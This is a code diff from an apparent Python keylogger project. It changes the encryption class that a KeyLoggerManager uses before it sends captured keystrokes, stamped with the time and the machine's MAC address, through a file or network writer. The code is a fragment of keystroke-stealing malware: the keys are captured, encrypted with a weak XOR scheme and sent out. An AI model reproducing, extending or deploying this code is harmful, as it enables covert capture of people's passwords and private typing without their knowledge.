@@ -1,7 +1,7 @@
 import json
 import sys
 sys.path.append('../../utilities/encryptionDecryption')
-from encryption import Encryption
+from xorEncryptor import XorEncryptor
 import uuid
 from logger.keylogger.keylogger_service import KeyloggerService
 from logger.writer.FileWriter import FileWriter
@@ -37,7 +37,7 @@ class KeyLoggerManager:
         self.mac_address = hex(uuid.getnode())
         self.writer = FileWriter() if self.config['writer'] == 'file_writer' else NetWorkWriter()
         self.keylogger = KeyloggerService()
-        self.encoder = Encryption(open('../../utilities/key.txt', 'r').read())
+        self.encoder = XorEncryptor(open('../../utilities/key.txt', 'r').read())
         self.flag = True
 
     def start(self):
@@ -68,7 +68,7 @@ class KeyLoggerManager:
             if logged_keys:
                 logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                 try:
-                    encrypted_data = self.encoder.encryption(logged_keys)
+                    encrypted_data = self.encoder.encrypt(logged_keys)
                     self.writer.send_data(encrypted_data, self.mac_address)
                     logging.info(f'Data written to {self.writer}')
                 except Exception as e:
